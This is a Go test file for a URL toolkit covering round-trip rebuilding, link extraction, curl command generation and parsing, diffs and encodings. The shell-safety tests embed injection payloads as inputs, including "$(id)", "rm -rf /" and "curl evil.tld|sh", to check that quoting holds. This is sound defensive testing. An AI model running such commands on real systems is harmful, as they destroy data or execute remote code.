package tests

import (
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync/atomic"
	"testing"

	"github.com/google/go-cmp/cmp"

	"github.com/Landver/site-of-tools/tools/linktools"
)

// This file covers the pure half of the suite: Rebuild, Extract, ToCurl /
// FromCurl, DiffInspections and EncodeAll. Nothing here opens a connection or
// needs Mongo, which is the property docs/07-testing.md opens with — "most
// features are pure functions from a string to a struct: no BINs, no upstream,
// no network, no skips" — and TestExtractOpensNoConnection below asserts it
// rather than merely asserting it in a comment.

// --- Rebuild ---------------------------------------------------------------

// roundTripCorpus is the corpus of docs/07-testing.md §2 plus the shapes that
// only the write half can get wrong: a default port that must NOT be tidied
// away, a bare "?", an IPv6 literal whose brackets Parse strips, an opaque
// scheme, and an "a+b" that means different things in a path and in a query.
var roundTripCorpus = []string{
	probe, // the headline case url_test.go drives the read half with
	"https://example.com/?b=1&a=2&c=3",
	"https://example.com/?id=1&id=2",
	"https://example.com/?debug",
	"https://example.com/?debug=",
	"https://example.com/?q=a+b",
	"https://example.com/a+b/c",
	"https://example.com/?x=%2520",
	"https://example.com/?bad=%zz",
	"https://example.com/?bad=%2",
	"https://example.com/a%2Fb/c",
	"https://example.com/a/b/../c",
	"https://example.com/cb#access_token=secret&state=xyz",
	"https://example.com/?u=https%3A%2F%2Finner.example%2F%3Fa%3D1",
	"https://example.com:8443/a?x=1",
	"https://example.com:443/a?x=1", // redundant port: dropping it is canonicalise's job, not Rebuild's
	"https://xn--80ak6aa92e.com/",
	"https://example.com/?", // ForceQuery: the bare "?" is part of the URL
	"https://example.com/",  //
	"https://example.com",   // no path at all
	"mailto:a@b.com",        // opaque
	"javascript:alert(1)",   // opaque, and hostile
	"file:///tmp/x",         // empty authority, which is not the same as none
	"https://example.com/?a=1;b=2&c=3",
	"http://[::1]:8080/x?y=1",
	"https://example.com/p%C3%A4th/?q=%C3%A4",
	"https://example.com/?t=YWJjK2RlZg%3D%3D",
	"https://example.com/?empty=&next=1",
	"https://example.com/#plain-frag",
	"https://example.com/?a=1#a/b?c",
	"https://example.com/%2f%2F?up=%2F", // lowercase escapes must not be upcased
	"https://example.com/?utm_source=x&gclid=y",
}

// TestRebuildRoundTripsByteForByte is the property docs/07-testing.md §2 says
// catches most encoding mistakes without a case per encoding rule.
//
// Byte-identical, not merely equivalent. "Equivalent" is the weaker claim every
// surveyed tool can already make, and it is the one that lets a copy button hand
// back a URL that is subtly not the one pasted in.
func TestRebuildRoundTripsByteForByte(t *testing.T) {
	t.Parallel()
	svc := linktools.NewService()
	for _, raw := range roundTripCorpus {
		in := parse(t, raw)
		got, err := svc.Rebuild(in)
		if err != nil {
			t.Errorf("Rebuild(Parse(%q)) errored: %v", raw, err)
			continue
		}
		if got != raw {
			t.Errorf("round trip is not byte-identical:\n in: %s\nout: %s\nThe copy button hands out the second string; it must be the first.", raw, got)
		}
	}
}

// TestRebuildNormalisesOnlyTheScheme documents the ONE legitimate departure, so
// that anything else which starts normalising fails the test above.
//
// url.Parse lowercases the scheme before Inspection ever sees it, so the
// uppercase spelling is gone by parse time and no amount of care in Rebuild can
// bring it back. Every other component survives untouched, which is what the
// second half asserts.
func TestRebuildNormalisesOnlyTheScheme(t *testing.T) {
	t.Parallel()
	const raw = "HTTPS://Example.COM/A?B=1"
	got, err := linktools.NewService().Rebuild(parse(t, raw))
	if err != nil {
		t.Fatalf("Rebuild errored: %v", err)
	}
	if got != "https://Example.COM/A?B=1" {
		t.Fatalf("rebuilt %q; want only the scheme lowercased (url.Parse does that before Rebuild is reached)", got)
	}
	// The host's case is the load-bearing half: lowercasing it here would be a
	// rewrite Rebuild is not allowed to make.
	if !strings.Contains(got, "Example.COM/A?B=1") {
		t.Error("host, path or key case was folded; only url.Parse's scheme lowercasing is permitted")
	}
}

// TestRebuildKeepsAMalformedEscapeMalformed is the calcbe bug, named.
//
// calcbe's table flags "%zz" honestly and its copy button hands back "%25zz" —
// a different URL from the one pasted in (docs/reports/calcbe-query-string-parser.md,
// "One inconsistency worth recording"). A tool that warns in one pane and mutates
// in the other is worse than one that does neither, and this round-trip feature
// exists precisely to avoid that.
func TestRebuildKeepsAMalformedEscapeMalformed(t *testing.T) {
	t.Parallel()
	svc := linktools.NewService()
	for _, raw := range []string{
		"https://example.com/?bad=%zz",
		"https://example.com/?bad=%2",
		"https://example.com/?a=1&bad=%zz&c=3",
	} {
		got, err := svc.Rebuild(parse(t, raw))
		if err != nil {
			t.Errorf("Rebuild(%q) errored: %v", raw, err)
			continue
		}
		if strings.Contains(got, "%25") {
			t.Errorf("%s rebuilt as %s — the malformed escape was re-encoded. That is the calcbe bug: a different URL handed back by the copy button.", raw, got)
		}
		if got != raw {
			t.Errorf("%s rebuilt as %s; a bad escape must survive verbatim", raw, got)
		}
	}
}

// TestRebuildPreservesOrderRepeatsAndValuelessness. Three separate things every
// map-based rebuilder loses, asserted on one URL because they are lost together.
func TestRebuildPreservesOrderRepeatsAndValuelessness(t *testing.T) {
	t.Parallel()
	const raw = "https://example.com/?z=1&a=2&id=1&id=2&debug&empty="
	got, err := linktools.NewService().Rebuild(parse(t, raw))
	if err != nil {
		t.Fatalf("Rebuild errored: %v", err)
	}
	if got != raw {
		t.Fatalf("rebuilt %q, want %q", got, raw)
	}
	// Re-parse rather than trusting the string: the round trip has to survive
	// being read back, which is the contract Rebuild's doc comment states.
	back := parse(t, got)
	var keys []string
	for _, p := range back.Params {
		keys = append(keys, p.Key)
	}
	if diff := cmp.Diff([]string{"z", "a", "id", "id", "debug", "empty"}, keys); diff != "" {
		t.Errorf("order or repeats lost through the round trip (-want +got):\n%s", diff)
	}
	if !findParam(t, back, "debug", 0).Valueless {
		t.Error(`"?debug" came back with an "="; that is a different request to a server, and it is what calcbe's copy button does`)
	}
	if findParam(t, back, "empty", 0).Valueless {
		t.Error(`"?empty=" came back valueless; it has a value, which is the empty string`)
	}
}

// TestRebuildRefusesRatherThanGuessing. A password is never stored (types.go
// keeps only HasPass), so there is nothing to write back — and writing the URL
// without it would hand over a different URL that still looks like it works.
func TestRebuildRefusesAPasswordItNeverStored(t *testing.T) {
	t.Parallel()
	got, err := linktools.NewService().Rebuild(parse(t, "https://user:hunter2@example.com/"))
	if err == nil {
		t.Fatalf("Rebuild returned %q for a URL carrying a password; it must refuse rather than emit a URL missing the credential", got)
	}
	if strings.Contains(err.Error(), "hunter2") {
		t.Error("the refusal echoes the password it exists not to store")
	}
}

// --- Extract ---------------------------------------------------------------

func extractOf(t *testing.T, text string) *linktools.Extraction {
	t.Helper()
	ex, err := linktools.NewService().Extract(text)
	if err != nil {
		t.Fatalf("Extract returned an error: %v", err)
	}
	return ex
}

func findURL(t *testing.T, ex *linktools.Extraction, u string) linktools.ExtractedURL {
	t.Helper()
	for _, row := range ex.URLs {
		if row.URL == u {
			return row
		}
	}
	t.Fatalf("no row for %q; got %d rows: %+v", u, len(ex.URLs), ex.URLs)
	return linktools.ExtractedURL{}
}

// TestExtractReadsHTML: href, src and the anchor text beside it. Anchor text is
// the reason this is a tokeniser walk and not a regex: "click here" pointing at
// a domain nobody recognises is the thing the page is for.
func TestExtractReadsHTML(t *testing.T) {
	t.Parallel()
	ex := extractOf(t, `<div><a href="https://a.example/1">First</a>`+
		` <img src="https://a.example/img.png" alt="A picture">`+
		` <a href="https://a.example/1">again</a></div>`)
	if ex.Source != linktools.SourceHTML {
		t.Fatalf("source = %q, want %q; reading HTML as text loses every anchor", ex.Source, linktools.SourceHTML)
	}
	first := findURL(t, ex, "https://a.example/1")
	if first.Anchor != "First" {
		t.Errorf("anchor = %q, want %q", first.Anchor, "First")
	}
	if first.Count != 2 {
		t.Errorf("count = %d, want 2 — the second occurrence must be counted, not dropped", first.Count)
	}
	if findURL(t, ex, "https://a.example/img.png").URL == "" {
		t.Error("a src= link was not extracted")
	}
}

// TestExtractReadsMarkdownAndPlainText, including the bare-URL case where the
// sentence's punctuation has to be told apart from the URL's own.
func TestExtractReadsMarkdownAndPlainText(t *testing.T) {
	t.Parallel()
	md := extractOf(t, "See [docs](https://md.example/docs) and [same](https://md.example/docs).")
	if md.Source != linktools.SourceMarkdown {
		t.Fatalf("source = %q, want %q", md.Source, linktools.SourceMarkdown)
	}
	row := findURL(t, md, "https://md.example/docs")
	if row.Count != 2 || row.Anchor != "docs" {
		t.Errorf("markdown row = %+v; want count 2 and anchor %q", row, "docs")
	}

	txt := extractOf(t, "plain https://bare.example/x, then (see https://bare.example/y) and https://en.example/wiki/Go_(language) too.")
	if txt.Source != linktools.SourceText {
		t.Fatalf("source = %q, want %q", txt.Source, linktools.SourceText)
	}
	for _, want := range []string{"https://bare.example/x", "https://bare.example/y", "https://en.example/wiki/Go_(language)"} {
		findURL(t, txt, want) // fatals with the full row list if the punctuation trim got it wrong
	}
}

// TestExtractDeduplicatesWithCounts: Total counts occurrences, Unique counts
// rows, and the two are different numbers on purpose.
func TestExtractDeduplicatesWithCounts(t *testing.T) {
	t.Parallel()
	ex := extractOf(t, "https://d.example/a https://d.example/a https://d.example/b")
	if ex.Unique != 2 {
		t.Errorf("unique = %d, want 2", ex.Unique)
	}
	if ex.Total != 3 {
		t.Errorf("total = %d, want 3 — Total is occurrences, Unique is rows, and collapsing them hides the repeat", ex.Total)
	}
	if got := findURL(t, ex, "https://d.example/a").Count; got != 2 {
		t.Errorf("count = %d, want 2", got)
	}
}

// TestExtractCapsAreAnnounced. Truncating silently would report "12 links in
// this newsletter" when there were 3000, which is worse than refusing: the
// caller acts on the number.
func TestExtractCapsAreAnnounced(t *testing.T) {
	t.Parallel()

	var many strings.Builder
	for i := 0; i < 2100; i++ {
		fmt.Fprintf(&many, "https://many.example/%d\n", i)
	}
	ex := extractOf(t, many.String())
	if len(ex.URLs) > 2000 {
		t.Errorf("listed %d rows; the table is capped", len(ex.URLs))
	}
	if !hasNoteTitle(ex.Notes, "The list stops at 2000") {
		t.Errorf("the row cap tripped with no note; the table would read as the complete list. Notes: %+v", ex.Notes)
	}

	var big strings.Builder
	for i := 0; big.Len() < (1<<20)+4096; i++ {
		fmt.Fprintf(&big, "https://big.example/%d\n", i)
	}
	ex = extractOf(t, big.String())
	if !hasNote(ex.Notes, linktools.SevWarn, "Only part of the input was read") {
		t.Errorf("the input cap tripped with no warning; links past the cut would look absent rather than unscanned. Notes: %+v", ex.Notes)
	}
}

// TestExtractSaysSoWhenItFoundNothing: an empty table and no explanation reads
// as a bug in the page.
func TestExtractSaysSoWhenItFoundNothing(t *testing.T) {
	t.Parallel()
	ex := extractOf(t, "example.com is a hostname in a sentence, not a link")
	if ex.Unique != 0 {
		t.Fatalf("extracted %d URLs from prose containing a bare hostname; guessing invents links that are not in the text", ex.Unique)
	}
	if !hasNote(ex.Notes, linktools.SevInfo, "No URLs found") {
		t.Errorf("no note explaining the empty table: %+v", ex.Notes)
	}
}

// TestExtractOpensNoConnection is the promise the whole feature is sold on: the
// surveyed tools that do this fetch every URL they find, which is a different
// and riskier claim (docs/reports/). Asserted with a real listener rather than a
// comment, because a comment cannot fail.
func TestExtractOpensNoConnection(t *testing.T) {
	t.Parallel()
	var hits atomic.Int64
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		hits.Add(1)
		w.WriteHeader(http.StatusOK)
	}))
	defer srv.Close()

	ex := extractOf(t, fmt.Sprintf(`<a href="%s/one">one</a> and %s/two`, srv.URL, srv.URL))
	if ex.Unique != 2 {
		t.Fatalf("extracted %d URLs, want 2", ex.Unique)
	}
	if n := hits.Load(); n != 0 {
		t.Errorf("Extract made %d HTTP request(s); it must never fetch what it finds", n)
	}
}

// --- ToCurl ----------------------------------------------------------------

// shellMeta are the bytes that stop being text and start being syntax the moment
// they sit outside a quoted run.
const shellMeta = "&;|<>$`()*?[]{}!~\n\r\t\\\"# "

// assertSingleQuoted walks a generated command the way /bin/sh would and reports
// any metacharacter that ended up outside a single-quoted run, plus an unbalanced
// quote. This is the check that matters: the output is text a human pastes into
// their shell.
//
// Three states, which is all POSIX sh needs for this grammar: inside '…' nothing
// is special; outside it a backslash makes exactly the next byte literal (that
// is the "escape" half of the '\” idiom, and it must not be read as opening a
// quoted run); everything else outside a quote has to be an ordinary byte.
func assertSingleQuoted(t *testing.T, line string) {
	t.Helper()
	inQuote := false
	for i := 0; i < len(line); i++ {
		c := line[i]
		switch {
		case c == '\'':
			inQuote = !inQuote
		case inQuote:
			// nothing at all is special inside '…'
		case c == '\\' && i+1 < len(line):
			i++ // the escaped byte is literal, whatever it is
		case c == ' ':
			// the separator between arguments
		case strings.IndexByte(shellMeta, c) >= 0:
			t.Errorf("%q sits UNQUOTED at byte %d of the generated command; pasted into a shell it is syntax, not part of the URL:\n%s",
				string(c), i, line)
		}
	}
	if inQuote {
		t.Errorf("the generated command ends inside an unterminated single quote, which swallows whatever the user types next:\n%s", line)
	}
}

// TestToCurlCannotBreakOutOfItsQuoting. A URL is attacker-influenced text and
// the output is something a human pastes into a shell, so an unquoted "&", ";",
// "|" or "$(…)" would stop being part of the URL and start being a command on
// their machine (the note on ToCurl).
func TestToCurlIsShellSafe(t *testing.T) {
	t.Parallel()
	svc := linktools.NewService()
	for _, raw := range []string{
		"https://example.com/?a=1&b=2",
		"https://example.com/?q=it's",
		"https://example.com/';id;'",
		"https://example.com/?q=$(id)&r=`id`;rm -rf /",
		"https://example.com/?q=';curl evil.tld|sh;'",
		"https://example.com/?q=%27%3B%20id%20%23",
		"https://example.com/?q=a b&r=<&s=>",
	} {
		line, err := svc.ToCurl(raw, linktools.CurlOptions{})
		if err != nil {
			t.Errorf("ToCurl(%q) errored: %v", raw, err)
			continue
		}
		assertSingleQuoted(t, line)
		// The strongest available proof that the escaping is correct rather
		// than merely present: tokenise the emitted line back with the
		// package's own shell-shaped reader and demand the original URL.
		back, _, err := svc.FromCurl(line)
		if err != nil {
			t.Errorf("the generated command does not tokenise back: %v\n%s", err, line)
			continue
		}
		if back != raw {
			t.Errorf("round trip through the shell quoting changed the URL:\n in: %s\nout: %s\n cmd: %s", raw, back, line)
		}
	}
}

// TestToCurlEscapesTheQuoteTheOnlyWayPossible. Single quotes are the only form in
// which nothing is special, and the one character they cannot hold is written
// '\” — close, escape, reopen.
func TestToCurlEscapesTheQuoteTheOnlyWayPossible(t *testing.T) {
	t.Parallel()
	line, err := linktools.NewService().ToCurl("https://example.com/?q=it's", linktools.CurlOptions{})
	if err != nil {
		t.Fatalf("ToCurl errored: %v", err)
	}
	if !strings.Contains(line, `'\''`) {
		t.Errorf("a single quote in the URL was not written as '\\'': %s", line)
	}
	if strings.Contains(line, `\'s`) && !strings.Contains(line, `'\''s`) {
		t.Errorf("the quote was backslash-escaped, which is literal inside '…' and does not close it: %s", line)
	}
}

// TestToCurlRefusesAControlCharacter. A newline in the URL would put a second
// line on the clipboard, and the second line is whatever the attacker wrote.
// Refusing is the right answer; emitting something subtly different is not.
func TestToCurlRefusesAControlCharacter(t *testing.T) {
	t.Parallel()
	line, err := linktools.NewService().ToCurl("https://example.com/?q=a\nid\n", linktools.CurlOptions{})
	if err == nil {
		t.Fatalf("a URL containing a newline was accepted and rendered as %q", line)
	}
	if line != "" {
		t.Errorf("a refused URL still produced output: %q", line)
	}
}

// TestToCurlQuotesTheOptionsItIsGiven too, not just the URL: the persona's user
// agent and an edited method are also caller-supplied text.
func TestToCurlQuotesItsOptions(t *testing.T) {
	t.Parallel()
	svc := linktools.NewService()
	line, err := svc.ToCurl("https://example.com/", linktools.CurlOptions{
		Persona: "googlebot", Method: "POST", FollowRedirects: true, ShowHeaders: true,
	})
	if err != nil {
		t.Fatalf("ToCurl errored: %v", err)
	}
	assertSingleQuoted(t, line)
	for _, want := range []string{"-L", "-i", "Googlebot"} {
		if !strings.Contains(line, want) {
			t.Errorf("generated command is missing %q: %s", want, line)
		}
	}
	if strings.Contains(line, "-k") {
		t.Error("-k was emitted without being asked for; it turns off certificate verification")
	}
	// A typo must not quietly send the wrong agent: the whole reason the option
	// exists is that the curl line and the traced request claim to be the same.
	if _, err := svc.ToCurl("https://example.com/", linktools.CurlOptions{Persona: "gooooglebot"}); err == nil {
		t.Error("an unknown persona was silently ignored rather than refused")
	}
}

// --- FromCurl --------------------------------------------------------------

func headerValue(hs []linktools.Header, name string) (string, bool) {
	for _, h := range hs {
		if strings.EqualFold(h.Name, name) {
			return h.Value, true
		}
	}
	return "", false
}

// TestFromCurlReadsChromesCopyAsCurl — the shape people actually paste:
// multi-line, backslash continuations, a pile of -H, and bash's $'…' quoting as
// soon as a value carries a quote or a non-ASCII byte.
func TestFromCurlReadsChromesCopyAsCurl(t *testing.T) {
	t.Parallel()
	const cmd = "curl 'https://example.com/api?a=1&b=2' \\\n" +
		"  -H 'authority: example.com' \\\n" +
		"  -H $'cookie: sid=abc; theme=d\\u00e4rk' \\\n" +
		"  -H \"accept: */*\" \\\n" +
		"  -H 'accept-language: en-GB,en;q=0.9' \\\n" +
		"  --compressed"
	u, hs, err := linktools.NewService().FromCurl(cmd)
	if err != nil {
		t.Fatalf("FromCurl errored: %v", err)
	}
	if u != "https://example.com/api?a=1&b=2" {
		t.Errorf("url = %q; the continuation-escaped first argument is the URL", u)
	}
	if len(hs) != 4 {
		t.Fatalf("got %d headers, want 4 — order and repeats are part of what was pasted: %+v", len(hs), hs)
	}
	if got, _ := headerValue(hs, "authority"); got != "example.com" {
		t.Errorf("single-quoted header = %q", got)
	}
	if got, _ := headerValue(hs, "accept"); got != "*/*" {
		t.Errorf("double-quoted header = %q", got)
	}
	if got, _ := headerValue(hs, "cookie"); got != "sid=abc; theme=därk" {
		t.Errorf("$'…' header = %q; the ANSI-C escapes were not expanded", got)
	}
}

// TestFromCurlReadsShortFlagClusters. "-XPOST" is a flag with its value stuck to
// it and "-sSLXPOST" is three booleans followed by one; getting this wrong makes
// a POST body or an output filename into the URL.
func TestFromCurlReadsShortFlagClusters(t *testing.T) {
	t.Parallel()
	svc := linktools.NewService()
	for _, tc := range []struct{ cmd, want string }{
		{"curl -XPOST -sSL https://example.com/x", "https://example.com/x"},
		{"curl -sSLXPOST https://example.com/x", "https://example.com/x"},
		{"curl --url=https://example.com/z", "https://example.com/z"},
		{"curl --url https://example.com/z", "https://example.com/z"},
		{"curl -o out.txt https://example.com/file", "https://example.com/file"},
		{"curl -d 'a=1&b=2' https://example.com/post", "https://example.com/post"},
		{"$ curl https://example.com/prompt", "https://example.com/prompt"},
	} {
		u, _, err := svc.FromCurl(tc.cmd)
		if err != nil {
			t.Errorf("FromCurl(%q) errored: %v", tc.cmd, err)
			continue
		}
		if u != tc.want {
			t.Errorf("FromCurl(%q) = %q, want %q — a flag argument was mistaken for the URL", tc.cmd, u, tc.want)
		}
	}
}

// TestFromCurlLiftsTheFlagsThatAreReallyHeaders. -A, -e and -b set headers, and a
// reader that only understands -H reports a request that is not the one pasted.
func TestFromCurlLiftsTheFlagsThatAreReallyHeaders(t *testing.T) {
	t.Parallel()
	_, hs, err := linktools.NewService().FromCurl(
		"curl -A 'MyAgent/1.0' -e 'https://ref.example/;auto' -b 'k=v' https://example.com/")
	if err != nil {
		t.Fatalf("FromCurl errored: %v", err)
	}
	for _, want := range []struct{ name, value string }{
		{"User-Agent", "MyAgent/1.0"},
		{"Referer", "https://ref.example/"},
		{"Cookie", "k=v"},
	} {
		got, ok := headerValue(hs, want.name)
		if !ok {
			t.Errorf("%s not reported: %+v", want.name, hs)
			continue
		}
		if got != want.value {
			t.Errorf("%s = %q, want %q", want.name, got, want.value)
		}
	}
}

// TestFromCurlEvaluatesNothing. The input is untrusted text and the only safe
// way to read it is not to evaluate it: no expansion, no substitution, no
// execution — the substitution is returned as the literal bytes it is.
func TestFromCurlEvaluatesNothing(t *testing.T) {
	t.Parallel()
	u, hs, err := linktools.NewService().FromCurl("curl 'https://example.com/?q=$(id)&h=`whoami`&home=$HOME'")
	if err != nil {
		t.Fatalf("FromCurl errored: %v", err)
	}
	if u != "https://example.com/?q=$(id)&h=`whoami`&home=$HOME" {
		t.Errorf("url = %q; a substitution or variable was expanded rather than kept literal", u)
	}
	if len(hs) != 0 {
		t.Errorf("headers invented from a command that had none: %+v", hs)
	}
}

// --- DiffInspections -------------------------------------------------------

func diffOf(t *testing.T, a, b string) *linktools.Diff {
	t.Helper()
	return linktools.DiffInspections(parse(t, a), parse(t, b))
}

func changeFor(t *testing.T, d *linktools.Diff, key string) linktools.ParamChange {
	t.Helper()
	for _, c := range d.Params {
		if c.Key == key {
			return c
		}
	}
	t.Fatalf("no row for %q; got %+v", key, d.Params)
	return linktools.ParamChange{}
}

// TestDiffNamesEveryKindOfChange. "Why does staging behave differently from
// production" is answered by one of these five words, so all five have to work.
func TestDiffNamesEveryKindOfChange(t *testing.T) {
	t.Parallel()
	for _, tc := range []struct {
		name, a, b string
		key        string
		want       linktools.ChangeKind
	}{
		{"added", "https://example.com/?a=1", "https://example.com/?a=1&b=2", "b", linktools.ChangeAdded},
		{"removed", "https://example.com/?a=1&b=2", "https://example.com/?a=1", "b", linktools.ChangeRemoved},
		{"modified", "https://example.com/?a=1", "https://example.com/?a=2", "a", linktools.ChangeModified},
		{"moved", "https://example.com/?a=1&b=2", "https://example.com/?b=2&a=1", "a", linktools.ChangeMoved},
		{"same", "https://example.com/?a=1&b=2", "https://example.com/?a=1&b=3", "a", linktools.ChangeSame},
	} {
		got := changeFor(t, diffOf(t, tc.a, tc.b), tc.key).Kind
		if got != tc.want {
			t.Errorf("%s: %q went from %s to %s and was reported as %q, want %q",
				tc.name, tc.key, tc.a, tc.b, got, tc.want)
		}
	}
}

// TestDiffReportsAReorderAsMoved, with the warning that makes it actionable.
// Harmless to most servers and fatal to any URL whose signature covers the
// literal query string, which is exactly why "nothing changed" is the wrong
// answer here.
func TestDiffReportsAReorderAsMoved(t *testing.T) {
	t.Parallel()
	d := diffOf(t, "https://example.com/?a=1&b=2&c=3", "https://example.com/?c=3&a=1&b=2")
	if d.Identical {
		t.Error("a reordered query was called identical; order is load-bearing for signed URLs")
	}
	if len(d.Fields) != 0 {
		t.Errorf("reordering the query reported a component change: %+v", d.Fields)
	}
	for _, c := range d.Params {
		if c.Kind != linktools.ChangeMoved {
			t.Errorf("%q reported as %q; nothing was added, removed or changed", c.Key, c.Kind)
		}
	}
	if !hasNote(d.Notes, linktools.SevWarn, "Only the order changed") {
		t.Errorf("no note naming the reorder: %+v", d.Notes)
	}
}

// TestDiffOnIdenticalURLs, and on two spellings of the same request.
func TestDiffOnIdenticalURLs(t *testing.T) {
	t.Parallel()
	d := diffOf(t, probe, probe)
	if !d.Identical {
		t.Errorf("a URL compared with itself is not identical: %s", d.Summary())
	}
	if len(d.Fields) != 0 {
		t.Errorf("component differences against itself: %+v", d.Fields)
	}

	// Same request, different text: still identical, and the note says why so
	// the reader does not think the tool missed something.
	eq := diffOf(t, "https://example.com/?a=a+b", "https://example.com/?a=a%20b")
	if !eq.Identical {
		t.Errorf("a+b and a%%20b describe the same request but were reported as different: %s", eq.Summary())
	}
	if !hasNote(eq.Notes, linktools.SevInfo, "Different text, same URL") {
		t.Errorf("no note explaining why two different strings compared equal: %+v", eq.Notes)
	}
}

// TestDiffSeesComponentsOutsideTheQuery. The staging-versus-production case is
// often the host or the port, not a parameter at all.
func TestDiffSeesComponentsOutsideTheQuery(t *testing.T) {
	t.Parallel()
	d := diffOf(t, "https://example.com/x?a=1", "https://staging.example.com:8443/y?a=1")
	fields := map[string]bool{}
	for _, f := range d.Fields {
		fields[f.Field] = true
	}
	for _, want := range []string{"host", "port", "path"} {
		if !fields[want] {
			t.Errorf("%s difference not reported: %+v", want, d.Fields)
		}
	}
	if d.Identical {
		t.Error("two different hosts reported as identical")
	}
}

// TestDiffKeepsRepeatedKeysApart: ?id=1&id=2 versus ?id=2&id=1 is a real
// difference, and a map-based diff cannot see it.
func TestDiffKeepsRepeatedKeysApart(t *testing.T) {
	t.Parallel()
	d := diffOf(t, "https://example.com/?id=1&id=2", "https://example.com/?id=2&id=1")
	if d.Identical {
		t.Fatal("two repeats swapped were reported as identical; a map-based diff collapses them and this one must not")
	}
	if len(d.Params) != 2 {
		t.Errorf("got %d rows for two occurrences of one key, want 2: %+v", len(d.Params), d.Params)
	}
}

// --- EncodeAll -------------------------------------------------------------

func encoding(t *testing.T, list []linktools.Encoding, name string) linktools.Encoding {
	t.Helper()
	for _, e := range list {
		if e.Name == name {
			return e
		}
	}
	t.Fatalf("no entry named %q; got %+v", name, list)
	return linktools.Encoding{}
}

// TestEncodeShowsQueryAndPathSideBySide is the page's whole differentiator.
// url.QueryEscape("a b") is "a+b" and url.PathEscape("a b") is "a%20b", and no
// surveyed tool makes that visible even though it is the single most common URL
// bug (encode.go's opening note).
func TestEncodeShowsQueryAndPathSideBySide(t *testing.T) {
	t.Parallel()
	for _, tc := range []struct{ in, query, path string }{
		{"a b", "a+b", "a%20b"},
		{"a+b", "a%2Bb", "a+b"},
	} {
		r := linktools.EncodeAll(tc.in)
		q := encoding(t, r.Encoded, "Percent (query)")
		p := encoding(t, r.Encoded, "Percent (path)")
		if q.Value != tc.query {
			t.Errorf("query encoding of %q = %q, want %q", tc.in, q.Value, tc.query)
		}
		if p.Value != tc.path {
			t.Errorf("path encoding of %q = %q, want %q", tc.in, p.Value, tc.path)
		}
		if q.Value == p.Value {
			t.Errorf("%q encodes identically for a query and a path; showing the difference is the reason this page exists", tc.in)
		}
		if q.Note == "" || p.Note == "" {
			t.Errorf("%q: a rule was applied with no note saying which; the two boxes are indistinguishable without one", tc.in)
		}
	}

	// The same split on the way back: "+" is a space to one reader and a plus to
	// the other, which is what breaks base64 values pasted into a query.
	r := linktools.EncodeAll("YWJjK2Rl")
	if qd, pd := encoding(t, r.Decoded, "Percent (query)"), encoding(t, r.Decoded, "Percent (path)"); qd.Note == "" || pd.Note == "" {
		t.Error("the decode side does not say which reading of '+' it used")
	}
}

// TestEncodeNeverShowsASilentlyEmptyBox. url.QueryUnescape returns "" plus an
// error on a bad escape, and an empty box reads as "this value is empty", which
// is a different claim (docs/reports/go-url-stdlib-behaviour.md §2).
func TestEncodeNeverShowsASilentlyEmptyBox(t *testing.T) {
	t.Parallel()
	for _, tc := range []struct{ in, name string }{
		{"%zz", "Percent (query)"},
		{"%2", "Percent (path)"},
		{"not base64 at all!", "Base64"},
	} {
		e := encoding(t, linktools.EncodeAll(tc.in).Decoded, tc.name)
		if e.Err == "" {
			t.Errorf("%q as %s: no error reported for a decode that failed", tc.in, tc.name)
		}
		if e.Value != "" {
			t.Errorf("%q as %s: a value was shown beside the failure (%q); one or the other, never both", tc.in, tc.name, e.Value)
		}
	}
}

// TestEncodeRunsTheSameLadderAsInspect, so a doubly-encoded value peels here too
// rather than needing a second paste into another page.
func TestEncodeRunsTheSameLadderAsInspect(t *testing.T) {
	t.Parallel()
	r := linktools.EncodeAll("%2520")
	if len(r.Layers) == 0 {
		t.Fatal("no decode ladder for a double-encoded value")
	}
	if got := r.Layers[len(r.Layers)-1].Value; got != " " {
		t.Errorf("ladder bottoms out at %q, want a single space", got)
	}
	if r.Input != "%2520" {
		t.Errorf("input not echoed back unchanged: %q", r.Input)
	}
}
